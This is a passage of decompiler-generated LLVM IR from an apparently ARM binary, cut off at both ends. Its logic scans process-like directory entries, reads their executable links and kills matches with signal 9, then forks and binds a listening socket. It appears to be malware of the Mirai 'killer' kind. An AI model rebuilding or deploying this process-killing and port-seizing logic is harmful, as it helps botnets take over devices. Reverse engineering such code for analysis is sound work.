dec_label_pc_f568.preheader:                      ; preds = %dec_label_pc_f568.preheader.lr.ph, %dec_label_pc_f558.loopexit
  %v0_f57090.in = phi %dirent* [ %v3_f55c41, %dec_label_pc_f568.preheader.lr.ph ], [ %v3_f55c, %dec_label_pc_f558.loopexit ]
  br label %dec_label_pc_f568

dec_label_pc_f568:                                ; preds = %dec_label_pc_f568.preheader, %dec_label_pc_f754
  %v0_f57c.in = phi %dirent* [ %v0_f57090.in, %dec_label_pc_f568.preheader ], [ %v3_f760, %dec_label_pc_f754 ]
  %v0_f568 = load i32, i32* @r5, align 4
  %v2_f568 = icmp eq i32 %v0_f568, 0
  br i1 %v2_f568, label %dec_label_pc_f570, label %dec_label_pc_f76c

dec_label_pc_f570:                                ; preds = %dec_label_pc_f568
  %v0_f57c = ptrtoint %dirent* %v0_f57c.in to i32
  %v1_f570 = add i32 %v0_f57c, 11
  %v2_f570 = inttoptr i32 %v1_f570 to i8*
  %v3_f570 = load i8, i8* %v2_f570, align 1
  %v4_f570 = zext i8 %v3_f570 to i32
  %v1_f574 = add nsw i32 %v4_f570, -48
  store i32 %v1_f570, i32* @r7, align 4
  %tmp = icmp ugt i32 %v1_f574, 9
  br i1 %tmp, label %dec_label_pc_f558.loopexit, label %dec_label_pc_f584

dec_label_pc_f584:                                ; preds = %dec_label_pc_f570
  %v3_f58c = call i32 @function_12f90(i32 6, i32* null)
  store i32 %v2_f2b0, i32* @r0, align 4
  %v3_f598 = call i32 @function_139c4(i8* %v2_f598, i32 %v3_f58c)
  %v2_f5a0 = call i32 @function_1399c(i8* %v2_f598)
  %v0_f5a4 = load i32, i32* @r7, align 4
  %v0_f5a8 = load i32, i32* @sl, align 4
  %v2_f5a8 = add i32 %v0_f5a8, %v2_f5a0
  store i32 %v2_f5a8, i32* @r0, align 4
  %v2_f5ac = inttoptr i32 %v2_f5a8 to i8*
  %v3_f5ac = call i32 @function_139c4(i8* %v2_f5ac, i32 %v0_f5a4)
  %v2_f5b4 = call i32 @function_1399c(i8* %v2_f598)
  %v0_f5b8 = load i32, i32* @r5, align 4
  store i32 %v2_f5b4, i32* %r4.global-to-local, align 4
  %v2_f5c4 = inttoptr i32 %v0_f5b8 to i32*
  %v3_f5c4 = call i32 @function_12f90(i32 7, i32* %v2_f5c4)
  %v0_f5cc = load i32, i32* @sl, align 4
  %v2_f5cc = add i32 %v2_f5b4, %v0_f5cc
  store i32 %v2_f5cc, i32* @r0, align 4
  %v2_f5d0 = inttoptr i32 %v2_f5cc to i8*
  %v3_f5d0 = call i32 @function_139c4(i8* %v2_f5d0, i32 %v3_f5c4)
  %v7_f5e0 = call i32 @readlink(i8* %v2_f598, i8* %tmp134, i32 4096)
  %v7_f5e4 = icmp eq i32 %v7_f5e0, -1
  br i1 %v7_f5e4, label %dec_label_pc_f558.loopexit, label %dec_label_pc_f5ec

dec_label_pc_f5ec:                                ; preds = %dec_label_pc_f584
  %v0_f5ec = load i32, i32* @r5, align 4
  %v2_f5f4 = inttoptr i32 %v0_f5ec to i32*
  %v3_f5f4 = call i32 @function_12f90(i32 6, i32* %v2_f5f4)
  store i32 %v2_f2b0, i32* @r0, align 4
  %v3_f600 = call i32 @function_139c4(i8* %v2_f598, i32 %v3_f5f4)
  %v2_f608 = call i32 @function_1399c(i8* %v2_f598)
  %v0_f60c = load i32, i32* @r7, align 4
  %v0_f610 = load i32, i32* @sl, align 4
  %v2_f610 = add i32 %v0_f610, %v2_f608
  store i32 %v2_f610, i32* @r0, align 4
  %v2_f614 = inttoptr i32 %v2_f610 to i8*
  %v3_f614 = call i32 @function_139c4(i8* %v2_f614, i32 %v0_f60c)
  %v2_f61c = call i32 @function_1399c(i8* %v2_f598)
  %v0_f620 = load i32, i32* @r5, align 4
  store i32 %v2_f61c, i32* %r4.global-to-local, align 4
  %v2_f62c = inttoptr i32 %v0_f620 to i32*
  %v3_f62c = call i32 @function_12f90(i32 9, i32* %v2_f62c)
  %v0_f634 = load i32, i32* @sl, align 4
  %v2_f634 = add i32 %v2_f61c, %v0_f634
  store i32 %v2_f634, i32* @r0, align 4
  %v2_f638 = inttoptr i32 %v2_f634 to i8*
  %v3_f638 = call i32 @function_139c4(i8* %v2_f638, i32 %v3_f62c)
  %v3_f640 = call %__dirstream* @opendir(i8* %v2_f598)
  %v5_f640 = ptrtoint %__dirstream* %v3_f640 to i32
  store i32 %v5_f640, i32* %sb.global-to-local, align 4
  %v2_f644 = icmp eq %__dirstream* %v3_f640, null
  br i1 %v2_f644, label %dec_label_pc_f558.loopexit, label %dec_label_pc_f64c.preheader

dec_label_pc_f64c.preheader:                      ; preds = %dec_label_pc_f5ec
  %v3_f650140 = call %dirent* @readdir(%__dirstream* nonnull %v3_f640)
  %v5_f650141 = ptrtoint %dirent* %v3_f650140 to i32
  store i32 %v5_f650141, i32* @r6, align 4
  %v2_f654143 = icmp eq %dirent* %v3_f650140, null
  br i1 %v2_f654143, label %dec_label_pc_f754, label %dec_label_pc_f664thread-pre-split

dec_label_pc_f64c.loopexit:                       ; preds = %dec_label_pc_f66c, %dec_label_pc_f704
  %v0_f64c.pre = load i32, i32* %sb.global-to-local, align 4
  %v1_f64c = inttoptr i32 %v0_f64c.pre to %__dirstream*
  %v3_f650 = call %dirent* @readdir(%__dirstream* %v1_f64c)
  %v5_f650 = ptrtoint %dirent* %v3_f650 to i32
  store i32 %v5_f650, i32* @r6, align 4
  %v2_f654 = icmp eq %dirent* %v3_f650, null
  br i1 %v2_f654, label %dec_label_pc_f754, label %dec_label_pc_f664thread-pre-split

dec_label_pc_f664thread-pre-split:                ; preds = %dec_label_pc_f64c.preheader, %dec_label_pc_f64c.loopexit
  %v0_f664.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_f664

dec_label_pc_f664:                                ; preds = %dec_label_pc_f664thread-pre-split, %dec_label_pc_f72c
  %v0_f664 = phi i32 [ %v0_f664.pr, %dec_label_pc_f664thread-pre-split ], [ 1, %dec_label_pc_f72c ]
  %v2_f664 = icmp eq i32 %v0_f664, 0
  br i1 %v2_f664, label %dec_label_pc_f66c, label %dec_label_pc_f754

dec_label_pc_f66c:                                ; preds = %dec_label_pc_f664
  %v2_f66c = call i32 @function_13a3c(i32 %v2_f2c4, i32 4096)
  %v0_f670 = load i32, i32* @r5, align 4
  %v2_f678 = inttoptr i32 %v0_f670 to i32*
  %v3_f678 = call i32 @function_12f90(i32 6, i32* %v2_f678)
  store i32 %v2_f2b0, i32* @r0, align 4
  %v3_f684 = call i32 @function_139c4(i8* %v2_f598, i32 %v3_f678)
  %v2_f68c = call i32 @function_1399c(i8* %v2_f598)
  %v0_f690 = load i32, i32* @r7, align 4
  %v0_f694 = load i32, i32* @sl, align 4
  %v2_f694 = add i32 %v0_f694, %v2_f68c
  store i32 %v2_f694, i32* @r0, align 4
  %v2_f698 = inttoptr i32 %v2_f694 to i8*
  %v3_f698 = call i32 @function_139c4(i8* %v2_f698, i32 %v0_f690)
  %v2_f6a0 = call i32 @function_1399c(i8* %v2_f598)
  %v0_f6a4 = load i32, i32* @r5, align 4
  store i32 %v2_f6a0, i32* @r4, align 4
  %v2_f6b0 = inttoptr i32 %v0_f6a4 to i32*
  %v3_f6b0 = call i32 @function_12f90(i32 9, i32* %v2_f6b0)
  %v0_f6b8 = load i32, i32* @sl, align 4
  %v1_f6b8 = load i32, i32* @r4, align 4
  %v2_f6b8 = add i32 %v1_f6b8, %v0_f6b8
  store i32 %v2_f6b8, i32* @r0, align 4
  %v2_f6bc = inttoptr i32 %v2_f6b8 to i8*
  %v3_f6bc = call i32 @function_139c4(i8* %v2_f6bc, i32 %v3_f6b0)
  %v2_f6c4 = call i32 @function_1399c(i8* %v2_f598)
  %v0_f6cc = load i32, i32* @sl, align 4
  %v2_f6cc = add i32 %v0_f6cc, %v2_f6c4
  store i32 %v2_f6cc, i32* @r0, align 4
  %v3_f6d0 = inttoptr i32 %v2_f6cc to i8*
  %v4_f6d0 = call i32 @function_139c4(i8* %v3_f6d0, i32 ptrtoint ([2 x i8]* @global_var_14300.78 to i32))
  %v2_f6d8 = call i32 @function_1399c(i8* %v2_f598)
  %v0_f6dc = load i32, i32* @r6, align 4
  %v1_f6dc = add i32 %v0_f6dc, 11
  %v0_f6e0 = load i32, i32* @sl, align 4
  %v2_f6e0 = add i32 %v0_f6e0, %v2_f6d8
  store i32 %v2_f6e0, i32* @r0, align 4
  %v2_f6e4 = inttoptr i32 %v2_f6e0 to i8*
  %v3_f6e4 = call i32 @function_139c4(i8* %v2_f6e4, i32 %v1_f6dc)
  %v7_f6f4 = call i32 @readlink(i8* %v2_f598, i8* %tmp134, i32 4096)
  %v7_f6f8 = icmp eq i32 %v7_f6f4, -1
  br i1 %v7_f6f8, label %dec_label_pc_f64c.loopexit, label %dec_label_pc_f704

dec_label_pc_f704:                                ; preds = %dec_label_pc_f66c
  %v2_f704 = call i32 @function_1399c(i8* %tmp134)
  store i32 %v2_f704, i32* @r1, align 4
  %v4_f718 = call i32 @function_13cf0(i8* %tmp134, i32 %v2_f704, i32 %v2_f528.pre-phi)
  %v7_f71c = icmp eq i32 %v4_f718, -1
  br i1 %v7_f71c, label %dec_label_pc_f64c.loopexit, label %dec_label_pc_f72c

dec_label_pc_f72c:                                ; preds = %dec_label_pc_f704
  %v0_f724 = load i32, i32* @r7, align 4
  %v2_f72c = inttoptr i32 %v0_f724 to i8*
  %v3_f72c = call i32 @function_13ac8(i8* %v2_f72c, i32 10)
  %v2_f734 = call i32 @kill(i32 %v3_f72c, i32 9)
  %v0_f738 = load i32, i32* %sb.global-to-local, align 4
  %v1_f738 = inttoptr i32 %v0_f738 to %__dirstream*
  %v3_f73c = call %dirent* @readdir(%__dirstream* %v1_f738)
  %v5_f73c = ptrtoint %dirent* %v3_f73c to i32
  store i32 %v5_f73c, i32* @r6, align 4
  %v2_f740 = icmp eq %dirent* %v3_f73c, null
  store i32 1, i32* @r5, align 4
  br i1 %v2_f740, label %dec_label_pc_f754, label %dec_label_pc_f664

dec_label_pc_f754:                                ; preds = %dec_label_pc_f64c.preheader, %dec_label_pc_f64c.loopexit, %dec_label_pc_f72c, %dec_label_pc_f664
  %v0_f754 = load i32, i32* %sb.global-to-local, align 4
  %v1_f754 = inttoptr i32 %v0_f754 to %__dirstream*
  %v3_f758 = call i32 @closedir(%__dirstream* %v1_f754)
  %v0_f75c = load i32, i32* @r8, align 4
  %v1_f75c = inttoptr i32 %v0_f75c to %__dirstream*
  %v3_f760 = call %dirent* @readdir(%__dirstream* %v1_f75c)
  %v2_f764 = icmp eq %dirent* %v3_f760, null
  br i1 %v2_f764, label %dec_label_pc_f76c, label %dec_label_pc_f568

dec_label_pc_f76c:                                ; preds = %dec_label_pc_f558.loopexit, %dec_label_pc_f754, %dec_label_pc_f568, %dec_label_pc_f558.preheader
  %v0_f76c = load i32, i32* @r8, align 4
  %v1_f76c = inttoptr i32 %v0_f76c to %__dirstream*
  %v3_f770 = call i32 @closedir(%__dirstream* %v1_f76c)
  %v0_f774 = load i32, i32* @r5, align 4
  %v1_f774 = urem i32 %v0_f774, 256
  br label %dec_label_pc_f778

dec_label_pc_f778:                                ; preds = %dec_label_pc_f538, %dec_label_pc_f76c
  %storemerge = phi i32 [ %v1_f774, %dec_label_pc_f76c ], [ %v5_f544, %dec_label_pc_f538 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_f77c = call i32 @sleep(i32 1)
  br label %dec_label_pc_f780

dec_label_pc_f780:                                ; preds = %dec_label_pc_f51c, %dec_label_pc_f778
  %v1_f784 = call i32 @function_12fbc(i32 6)
  %v1_f78c = call i32 @function_12fbc(i32 7)
  %v1_f794 = call i32 @function_12fbc(i32 9)
  br label %dec_label_pc_f798

dec_label_pc_f798:                                ; preds = %dec_label_pc_f34c, %dec_label_pc_f780
  %v0_f798 = load i32, i32* @r4, align 4
  %v2_f7a4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f7a4, i32* @r4, align 4
  store i32 %v6_f29c, i32* @r5, align 4
  store i32 %v9_f29c, i32* @r6, align 4
  store i32 %v12_f29c, i32* @r7, align 4
  store i32 %v15_f29c, i32* @r8, align 4
  store i32 %v21_f29c, i32* @sl, align 4
  ret i32 %v0_f798

dec_label_pc_f7a8:                                ; preds = %dec_label_pc_f48c
  %v1_f7a8 = add i32 %v0_f7a8, 1
  %v7_f7ac = icmp eq i32 %v0_f7a8, 0
  br i1 %v7_f7ac, label %dec_label_pc_f7b4, label %dec_label_pc_f494

dec_label_pc_f7b4:                                ; preds = %dec_label_pc_f7a8
  %v1_f7b4 = add i32 %v0_f49c, 3
  %v2_f7b4 = inttoptr i32 %v1_f7b4 to i8*
  %v3_f7b4 = load i8, i8* %v2_f7b4, align 1
  %v7_f7b8 = icmp eq i8 %v3_f7b4, 65
  br i1 %v7_f7b8, label %dec_label_pc_f7c8, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_f7b4
  br label %dec_label_pc_f464.backedge

dec_label_pc_f7c8:                                ; preds = %dec_label_pc_f7b4
  store i32 %v1_f7a8, i32* @r4, align 4
  br label %dec_label_pc_f464.backedge

dec_label_pc_f464.backedge:                       ; preds = %.thread33, %dec_label_pc_f7c8, %dec_label_pc_f498
  %v0_f4a481 = phi i32 [ %v1_f7a8, %dec_label_pc_f7c8 ], [ %v0_f4a482, %dec_label_pc_f498 ], [ %v0_f4a482, %.thread33 ]
  %v0_f7a870 = phi i32 [ %v1_f7a8, %dec_label_pc_f7c8 ], [ %v0_f498, %dec_label_pc_f498 ], [ %v1_f7a8, %.thread33 ]
  %v0_f48c.pr67 = phi i32 [ 0, %dec_label_pc_f7c8 ], [ %v0_f48c.pr68, %dec_label_pc_f498 ], [ 0, %.thread33 ]
  %v0_f464 = add i32 %v0_f49c, 1
  %v1_f464 = add i32 %v0_f49c, 3
  %v2_f464 = inttoptr i32 %v1_f464 to i8*
  %v3_f464 = load i8, i8* %v2_f464, align 1
  %v2_f468 = icmp eq i8 %v3_f464, 0
  %v1_f46c = add i32 %v0_f46c78, 1
  br i1 %v2_f468, label %dec_label_pc_f4a4, label %dec_label_pc_f474

dec_label_pc_f7d8:                                ; preds = %dec_label_pc_f29c
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_f34c

; uselistorder directives
  uselistorder i32 %v1_f46c, { 1, 0 }
  uselistorder i8 %v3_f464, { 1, 0 }
  uselistorder i32 %v0_f4a481, { 1, 0 }
  uselistorder i32 %v1_f7a8, { 4, 3, 0, 2, 1 }
  uselistorder %dirent* %v3_f760, { 1, 0 }
  uselistorder i8* %tmp134, { 1, 0, 2, 3 }
  uselistorder i32 %v1_f4d0, { 1, 0 }
  uselistorder i32 %v0_f4dc28, { 1, 0 }
  uselistorder i32 %v1_f4f4, { 0, 3, 1, 2 }
  uselistorder i32 %v0_f498, { 1, 0 }
  uselistorder i32 %v0_f46c78, { 1, 0 }
  uselistorder i32 %v0_f7a8, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_f4a482, { 1, 2, 0 }
  uselistorder i32 %v1_f46c52, { 1, 0 }
  uselistorder i32 %v2_f450, { 1, 0 }
  uselistorder i32 %v1_f44c, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v0_f40813, { 1, 0, 2 }
  uselistorder i32 %v0_f3f8, { 1, 0 }
  uselistorder i32 %v1_f3d8, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v4_f36c, { 1, 2, 0 }
  uselistorder i32* %v3_f30c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8773, { 1, 0, 2 }
  uselistorder i8* %stack_var_-581, { 2, 0, 1 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 (i8*, i32)* @function_13ac8, { 1, 0, 2, 3, 4 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_14300.78 to i32), { 2, 1, 0 }
  uselistorder i32 (i32*, i32, i32)* @function_13bf4, { 1, 0 }
  uselistorder i32 512, { 4, 0, 1, 7, 5, 6, 8, 2, 9, 3, 10 }
  uselistorder label %dec_label_pc_f464.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_f798, { 1, 0 }
  uselistorder label %dec_label_pc_f780, { 1, 0 }
  uselistorder label %dec_label_pc_f778, { 1, 0 }
  uselistorder label %dec_label_pc_f76c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_f754, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_f664, { 1, 0 }
  uselistorder label %dec_label_pc_f664thread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_f64c.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_f568, { 1, 0 }
  uselistorder label %dec_label_pc_f568.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_f558.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f4f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f498, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f474, { 1, 0 }
  uselistorder label %dec_label_pc_f418, { 2, 0, 1 }
  uselistorder label %dec_label_pc_f37c.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_f3cc, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_f394, { 1, 0 }
  uselistorder label %dec_label_pc_f34c, { 1, 0 }
}

define i32 @function_f808(i32 %arg1) local_unnamed_addr {
dec_label_pc_f808:
  %fp.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-4312 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-8408 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-8428 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f808 = load i32, i32* @r4, align 4
  store i32 %v3_f808, i32* %stack_var_-36, align 4
  %v6_f808 = load i32, i32* @r5, align 4
  %v9_f808 = load i32, i32* @r6, align 4
  %v12_f808 = load i32, i32* @r7, align 4
  %v15_f808 = load i32, i32* @r8, align 4
  %v2_f818 = call i32 @time(i32* null)
  store i32 %v2_f818, i32* @r7, align 4
  %v0_f820 = call i32 @fork()
  %v7_f824 = icmp eq i32 %v0_f820, -1
  %. = zext i1 %v7_f824 to i32
  %tmp213 = icmp slt i32 %v0_f820, 1
  %storemerge175 = select i1 %tmp213, i32 %., i32 1
  store i32 %storemerge175, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1cd50.151 to i32), i32* %r3.global-to-local, align 4
  %v2_f840 = icmp eq i32 %storemerge175, 0
  store i32 %v0_f820, i32* @global_var_1cd50.151, align 4
  br i1 %v2_f840, label %dec_label_pc_f858, label %dec_label_pc_f84c

dec_label_pc_f84c:                                ; preds = %dec_label_pc_f9d4, %dec_label_pc_f8bc, %dec_label_pc_f808
  %v29_f854 = phi i32 [ %v4_f960, %dec_label_pc_f8bc ], [ %v0_f820, %dec_label_pc_f808 ], [ %v5_f9e8, %dec_label_pc_f9d4 ]
  %v2_f854 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f854, i32* @r4, align 4
  store i32 %v6_f808, i32* @r5, align 4
  store i32 %v9_f808, i32* @r6, align 4
  store i32 %v12_f808, i32* @r7, align 4
  store i32 %v15_f808, i32* @r8, align 4
  ret i32 %v29_f854

dec_label_pc_f858:                                ; preds = %dec_label_pc_f808
  %v2_f858 = ptrtoint i32* %stack_var_-236 to i32
  store i32 %v2_f858, i32* %r1.global-to-local, align 4
  store i32 2, i32* @r4, align 4
  store i32 2, i32* %stack_var_-72, align 4
  %v1_f870 = call i32 @function_f29c(i32 5888)
  store i32 23, i32* %r3.global-to-local, align 4
  %v0_f87c = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_f884 = load i32, i32* @r5, align 4
  store i32 %v0_f884, i32* %r2.global-to-local, align 4
  %v3_f890 = call i32 @socket(i32 %v0_f87c, i32 1, i32 %v0_f884)
  %v7_f894 = icmp eq i32 %v3_f890, -1
  store i32 %v3_f890, i32* @r4, align 4
  br i1 %v7_f894, label %dec_label_pc_f8bc, label %dec_label_pc_f8a0

dec_label_pc_f8a0:                                ; preds = %dec_label_pc_f858
  %v2_f8a4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_f8a4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v6_f8ac = call i32 @bind(i32 %v2_f8a4, %sockaddr* inttoptr (i32 16 to %sockaddr*), i32 16)
  %v0_f8b0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_f8b8 = call i32 @listen(i32 %v0_f8b0, i32 1)
  br label %dec_label_pc_f8bc

dec_label_pc_f8bc:                                ; preds = %dec_label_pc_f858, %dec_label_pc_f8a0
  %v1_f8c0 = call i32 @sleep(i32 5)
  %v1_f8c8 = call i32* @malloc(i32 4096)
  %v3_f8c8 = ptrtoint i32* %v1_f8c8 to i32
  store i32 ptrtoint (i32* @global_var_1ccf8.157 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_1cd4c.159 to i32), i32* %r1.global-to-local, align 4
  store i32 %v3_f8c8, i32* %r2.global-to-local, align 4
  %v0_f8d8 = load i32, i32* @r5, align 4
  %v1_f8d8 = trunc i32 %v0_f8d8 to i8
  %v3_f8d8 = bitcast i32* %v1_f8c8 to i8*
  store i8 %v1_f8d8, i8* %v3_f8d8, align 1
  %v0_f8e0 = load i32, i32* @r5, align 4
  %v1_f8e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_f8e0 = inttoptr i32 %v1_f8e0 to i32*
  store i32 %v0_f8e0, i32* %v2_f8e0, align 4
  %v0_f8e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_f8e4 = load i32, i32* %r1.global-to-local, align 4
  %v2_f8e4 = inttoptr i32 %v1_f8e4 to i32*
  store i32 %v0_f8e4, i32* %v2_f8e4, align 4
  %v1_f8e8 = call i32 @function_13074(i32 6)
  %v1_f8f0 = call i32 @function_13074(i32 7)
  %v0_f8f4 = load i32, i32* @r5, align 4
  store i32 %v0_f8f4, i32* %r1.global-to-local, align 4
  %v2_f8fc = inttoptr i32 %v0_f8f4 to i32*
  %v3_f8fc = call i32 @function_12f90(i32 6, i32* %v2_f8fc)
  %v2_f904 = ptrtoint i32* %stack_var_-8408 to i32
  store i32 %v2_f904, i32* @r8, align 4
  store i32 %v3_f8fc, i32* %r1.global-to-local, align 4
  store i32 %v2_f904, i32* @r0, align 4
  %v2_f910 = bitcast i32* %stack_var_-8408 to i8*
  %v3_f910 = call i32 @function_139c4(i8* %v2_f910, i32 %v3_f8fc)
  %v0_f914 = load i32, i32* @r8, align 4
  %v2_f914 = add i32 %v0_f914, %v3_f910
  store i32 %v2_f914, i32* @r4, align 4
  %v0_f918 = call i32 @getpid()
  %v2_f920 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_f920, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_f928 = trunc i32 %v0_f918 to i8
  %v4_f928 = call i32 @function_13e90(i8 %v3_f928, i32 10, i32 %v2_f920)
  store i32 %v4_f928, i32* %r1.global-to-local, align 4
  %v0_f930 = load i32, i32* @r4, align 4
  store i32 %v0_f930, i32* @r0, align 4
  %v2_f934 = inttoptr i32 %v0_f930 to i8*
  %v3_f934 = call i32 @function_139c4(i8* %v2_f934, i32 %v4_f928)
  %v0_f938 = load i32, i32* @r5, align 4
  store i32 %v0_f938, i32* %r1.global-to-local, align 4
  %v0_f93c = load i32, i32* @r4, align 4
  %v2_f93c = add i32 %v0_f93c, %v3_f934
  store i32 %v2_f93c, i32* @r4, align 4
  %v2_f944 = inttoptr i32 %v0_f938 to i32*
  %v3_f944 = call i32 @function_12f90(i32 7, i32* %v2_f944)
  store i32 %v3_f944, i32* %r1.global-to-local, align 4
  %v0_f94c = load i32, i32* @r4, align 4
  store i32 %v0_f94c, i32* @r0, align 4
  %v2_f950 = inttoptr i32 %v0_f94c to i8*
  %v3_f950 = call i32 @function_139c4(i8* %v2_f950, i32 %v3_f944)
  %v0_f954 = load i32, i32* @r5, align 4
  store i32 %v0_f954, i32* %r1.global-to-local, align 4
  store i32 %v3_f950, i32* @r6, align 4
  %v4_f960 = call i32 (i8*, i32, ...) @open(i8* %v2_f910, i32 %v0_f954)
  %v7_f964 = icmp eq i32 %v4_f960, -1
  br i1 %v7_f964, label %dec_label_pc_f84c, label %dec_label_pc_f96c

dec_label_pc_f96c:                                ; preds = %dec_label_pc_f8bc
  %v1_f96c = call i32 @close(i32 %v4_f960)
  %v1_f974 = call i32 @function_12fbc(i32 6)
  %v1_f97c = call i32 @function_12fbc(i32 7)
  store i32 ptrtoint (i8** @global_var_1cd4c.159 to i32), i32* %r3.global-to-local, align 4
  %v2_f988 = load i8*, i8** @global_var_1cd4c.159, align 4
  %v3_f988 = ptrtoint i8* %v2_f988 to i32
  store i32 %v3_f988, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v7_f994 = call i32 @readlink(i8* %v2_f910, i8* %v2_f988, i32 4095)
  %v7_f998 = icmp eq i32 %v7_f994, -1
  br i1 %v7_f998, label %.thread5.thread, label %bb216

.thread5.thread:                                  ; preds = %dec_label_pc_f96c
  %v0_f9a454 = load i32, i32* @r4, align 4
  %v1_f9a455 = load i32, i32* @r6, align 4
  %v2_f9a456 = add i32 %v1_f9a455, %v0_f9a454
  store i32 %v2_f9a456, i32* %r1.global-to-local, align 4
  br label %bb217

bb216:                                            ; preds = %dec_label_pc_f96c
  %v3_f9a0 = load i32, i32* bitcast (i8** @global_var_1cd4c.159 to i32*), align 4
  store i32 %v3_f9a0, i32* %r3.global-to-local, align 4
  %v0_f9a4 = load i32, i32* @r4, align 4
  %v1_f9a4 = load i32, i32* @r6, align 4
  %v2_f9a4 = add i32 %v1_f9a4, %v0_f9a4
  store i32 %v2_f9a4, i32* %r1.global-to-local, align 4
  %v1_f9a8 = load i32, i32* @r5, align 4
  %v2_f9a8 = trunc i32 %v1_f9a8 to i8
  %v5_f9a8 = add i32 %v3_f9a0, %v7_f994
  %v6_f9a8 = inttoptr i32 %v5_f9a8 to i8*
  store i8 %v2_f9a8, i8* %v6_f9a8, align 1
  %v1_f9ac.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb217

bb217:                                            ; preds = %.thread5.thread, %bb216
  %v1_f9ac = phi i32 [ %v2_f9a456, %.thread5.thread ], [ %v1_f9ac.pre, %bb216 ]
  %v0_f9ac = load i32, i32* @r8, align 4
  %v2_f9ac = sub i32 %v1_f9ac, %v0_f9ac
  store i32 %v2_f9ac, i32* %r1.global-to-local, align 4
  %v2_f9b4 = call i32 @function_13a3c(i32 %v2_f904, i32 %v2_f9ac)
  %v2_f9c0 = ptrtoint i32* %stack_var_-4312 to i32
  store i32 %v2_f9c0, i32* %r1.global-to-local, align 4
  store i32 %v2_f9c0, i32* %stack_var_-8428, align 4
  %v0_f9c8 = load i32, i32* @r5, align 4
  %v0_f9cc = load i32, i32* @r7, align 4
  store i32 %v0_f9cc, i32* @r4, align 4
  store i32 400, i32* @r5, align 4
  %v2_fac8 = ptrtoint i32* %stack_var_-152 to i32
  %v2_facc = bitcast i32* %stack_var_-152 to i8*
  %v2_fb18 = ptrtoint i32* %stack_var_-216 to i32
  %v2_fb1c = bitcast i32* %stack_var_-216 to i8*
  %v2_fc8c = ptrtoint i32* %stack_var_-44 to i32
  %v2_fc9c = ptrtoint i32* %stack_var_-48 to i32
  %v2_fcb0 = ptrtoint i32* %stack_var_-52 to i32
  %v2_fcc4 = ptrtoint i32* %stack_var_-40 to i32
  %v2_fcdc = ptrtoint i32* %stack_var_-56 to i32
  %v2_fb94 = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_f9d4

dec_label_pc_f9d4:                                ; preds = %dec_label_pc_fa8c, %bb217
  %stack_var_-8420.0 = phi i32 [ %v0_f9c8, %bb217 ], [ %stack_var_-8420.3, %dec_label_pc_fa8c ]
  %v1_f9d8 = call i32 @function_13074(i32 6)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_f9e4 = call i32 @function_12f90(i32 6, i32* null)
  %v4_f9e4 = inttoptr i32 %v3_f9e4 to i8*
  %v3_f9e8 = call %__dirstream* @opendir(i8* %v4_f9e4)
  %v5_f9e8 = ptrtoint %__dirstream* %v3_f9e8 to i32
  store i32 %v5_f9e8, i32* %sl.global-to-local, align 4
  %v2_f9ec = icmp eq %__dirstream* %v3_f9e8, null
  br i1 %v2_f9ec, label %dec_label_pc_f84c, label %dec_label_pc_f9f4

dec_label_pc_f9f4:                                ; preds = %dec_label_pc_f9d4
  %v1_f9f8 = call i32 @function_12fbc(i32 6)
  %v0_f9fc117 = load i32, i32* %sl.global-to-local, align 4
  %v1_f9fc118 = inttoptr i32 %v0_f9fc117 to %__dirstream*
  %v3_fa00119 = call %dirent* @readdir(%__dirstream* %v1_f9fc118)
